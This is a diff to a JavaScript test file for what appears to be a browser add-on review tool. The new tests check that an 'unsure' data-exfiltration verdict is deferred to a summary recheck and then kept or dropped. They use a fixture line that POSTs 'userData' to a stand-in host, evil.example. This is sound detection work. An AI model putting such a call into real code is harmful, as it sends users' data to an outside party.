@@ -10,12 +10,27 @@
 import { test } from "node:test";
 import assert from "node:assert/strict";
 
+import path from "node:path";
+import { fileURLToPath } from "node:url";
+
 import { withManifest, parsed } from "./manifest-ctx.js";
 import { createLlmClient } from "../../src/checks/llm-client.js";
 import { buildAddonSummarizer } from "../../src/checks/summaries.js";
-import { loadRegistry, loadChecks } from "../../src/checks/registry.js";
+import {
+  runChecks,
+  loadRegistry,
+  loadChecks,
+} from "../../src/checks/registry.js";
 import { resolvePermissionRecheck } from "../../src/lib/recheck.js";
 import { fakeReviewTransport } from "./fake-llm.js";
+import { makeFakeTransport } from "../fake-llm.js";
+import { buildSchemaIndex } from "../../src/schema/index.js";
+import { loadSchemaFiles } from "../../src/schema/load.js";
+
+const here = path.dirname(fileURLToPath(import.meta.url));
+const schema = buildSchemaIndex(
+  loadSchemaFiles(path.join(here, "..", "schema-fixture"))
+);
 
 const BG = "tabs.executeScript(tabId);\nconst other = 1;\n";
 const MANIFEST = {
@@ -143,4 +158,98 @@ test("an uncertain or missing site verdict falls to manual review", async () => 
       `${name}: falls to manual`
     );
   }
+});
+
+// The two-stage funnel: a DIRECT evaluate() llm check that returns `unsure` for a candidate
+// defers it to that check's post-summary recheck, which the whole-add-on summary re-judges -
+// with the FULL add-on in the prompt. Driven end to end through runChecks: data-exfiltration
+// (an llm-phase evaluate check) -> unsure -> data-exfiltration-recheck (the summary re-judges).
+const EXFIL_BG =
+  'fetch("https://evil.example/collect", { method: "POST", body: userData });\nconst other = 1;\n';
+const EXFIL_MANIFEST = {
+  manifest_version: 3,
+  name: "x",
+  version: "1",
+  background: { scripts: ["bg.js"] },
+  permissions: [],
+};
+
+// Drive data-exfiltration + its recheck through runChecks with BOTH lanes faked
+// (evaluate -> unsure; the summary re-judges the deferred sink with `reviewVerdict`).
+async function driveExfil(reviewVerdict) {
+  const jsSources = parsed([
+    { file: "bg.js", code: EXFIL_BG, lineOffset: 0, inline: false },
+  ]);
+  const ctx = withManifest({
+    schema,
+    jsSources,
+    apiUsages: [],
+    addon: {
+      manifest: EXFIL_MANIFEST,
+      files: new Map([
+        ["manifest.json", Buffer.from(JSON.stringify(EXFIL_MANIFEST), "utf8")],
+        ["bg.js", Buffer.from(EXFIL_BG, "utf8")],
+      ]),
+      bundled: { nonAuthored: new Set() },
+    },
+  });
+  const registry = loadRegistry();
+  const fake = makeFakeTransport({
+    // The lone sink is judged `unsure` -> NOT a direct finding, deferred to the recheck.
+    verdicts: () => "unsure",
+    review: {
+      summary: "s",
+      recheckVerdicts: {
+        "data-exfiltration-recheck": { "bg.js:1": reviewVerdict },
+      },
+    },
+  });
+  const reviewCalls = [];
+  const callReview = async (p) => {
+    reviewCalls.push(p);
+    return fake.callReview(p);
+  };
+  ctx.llm = createLlmClient({
+    ctx,
+    token: "t",
+    systemIntro: "intro",
+    callVerdicts: fake.callVerdicts,
+    callReview,
+  });
+  const out = await runChecks(
+    ctx,
+    registry,
+    {
+      only: ["data-exfiltration", "data-exfiltration-recheck"],
+      recheckActive: true,
+    },
+    {}
+  );
+  return { out, ctx, prompt: reviewCalls[0] };
+}
+
+test("an unsure evaluate() verdict is deferred and re-judged by the summary with the full add-on", async () => {
+  const { out, ctx, prompt } = await driveExfil("fail");
+  // (1) the unsure sink was handed to the post-summary recheck consumer (keyed file:line).
+  const handed = ctx.recheck?.get("data-exfiltration-recheck") ?? [];
+  assert.ok(
+    handed.some((r) => r.file === "bg.js" && r.loc?.line === 1),
+    "the unsure sink is deferred to data-exfiltration-recheck"
+  );
+  // (2) the summary saw the FULL add-on - the numbered source line of the sink is in the prompt.
+  assert.ok(prompt, "reviewAddon was called");
+  assert.match(prompt.prompt, /1: fetch\("https:\/\/evil\.example\/collect"/);
+  // (3) the summary's `fail` becomes the data-exfiltration finding at the sink's file:line.
+  assert.ok(
+    out.findings.some((f) => f.file === "bg.js" && f.loc?.line === 1),
+    "fail -> a finding at the sink"
+  );
+});
+
+test("a summary `pass` on the deferred sink drops it (no finding)", async () => {
+  const { out } = await driveExfil("pass");
+  assert.ok(
+    !out.findings.some((f) => f.file === "bg.js" && f.loc?.line === 1),
+    "pass -> dropped, no data-exfiltration finding"
+  );
 });
